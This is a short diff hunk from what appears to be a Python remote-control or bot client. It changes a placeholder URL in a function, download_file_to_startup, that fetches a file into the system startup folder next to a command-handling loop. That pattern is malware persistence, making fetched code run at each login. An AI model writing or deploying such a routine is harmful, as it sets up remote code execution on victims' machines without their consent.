@@ -102,7 +102,7 @@ def handle_commands():
             time.sleep(5)
 
 def download_file_to_startup():
-    url = 'download_link'
+    url = 'http://download_link/'
     startup_directory = get_startup_directory()
 
     if not os.path.exists(startup_directory):
